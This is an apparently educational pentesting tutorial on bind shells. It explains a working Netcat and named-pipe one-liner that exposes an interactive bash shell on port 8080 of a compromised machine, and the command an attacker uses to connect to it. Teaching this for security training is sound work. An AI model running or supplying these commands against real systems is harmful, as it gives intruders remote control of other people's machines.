## Bind Shell
As the name indicates, a **`bind shell`** will bind a port on the compromised system and listen for a connection; when this connection occurs, it exposes the shell session so the attacker can execute commands remotely.

This method can be used when the compromised target does not allow outgoing connections, but it tends to be less popular since it needs to remain active and listen for connections, which can lead to detection.

### How bind shells work
#### **Setting Up the Bind Shell on the Target**

Let's create a bind shell. In this case, the attacker can use a command like the one below on the target machine.

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

#### **Explanation of the Payload:**
**` rm -f /tmp/f `** - This command removes any existing named pipe file located at /tmp/f/. This ensures that the script can create a new named pipe without conflicts.  
**`mkfifo /tmp/f `** - This command creates a named pipe, or FIFO, at /tmp/f. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.  
**`cat /tmp/f `** - This command reads data from the named pipe. It waits for input that can be sent through the pipe.  
**`| bash -i 2>&1 `** - The output of cat is piped to a shell instance (bash -i), which allows the attacker to execute commands interactively. The 2>&1 redirects standard error to standard output, ensuring error messages are returned to the attacker.  
**`| nc -l 0.0.0.0 8080 `** - Starts Netcat in listen mode (-l) on all interfaces (0.0.0.0) and port 8080. The shell will be exposed to the attacker once they connect to this port.  
**`>/tmp/f `** This final part sends the commands' output back into the named pipe, allowing for bidirectional communication.  
The command above will listen for incoming connections and expose a bash shell. We need to note that ports below 1024 will require Netcat to be executed with elevated privileges. In this case, using port 8080 will avoid this.  

#### **Terminal on the Target Machine (Bind Shell Setup)**

💡💡💡
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```
Once the command is executed, it will wait for an incoming connection, as shown above.

#### **Attacker Connects to the Bind Shell**

🚨🚨🚨  Now that the target machine is waiting for incoming connections, we can use Netcat again with the following command to connect:
```bash
nc -nv TARGET_IP 8080
```

#### **Explanation of the command:**
**` nc `** - This invokes Netcat, which establishes the connection to the target.  
**` -n `** - Disables DNS resolution, allowing Netcat to operate faster and avoid unnecessary lookups.  
**` -v `** - Verbose mode provides detailed output of the connection process, such as when the connection is established.  
**` TARGET_IP `** - The IP address of the target machine where the bind shell is running.  
**` 8080 `** - The port number on which the bind shell listens.  

#### **Attacker Terminal (After Connection)**

```bash
attacker@kali:~$ nc -nv 10.10.13.37 8080 
(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
target@tryhackme:~$
```
After connecting, we can get a shell, as shown above, and execute commands.
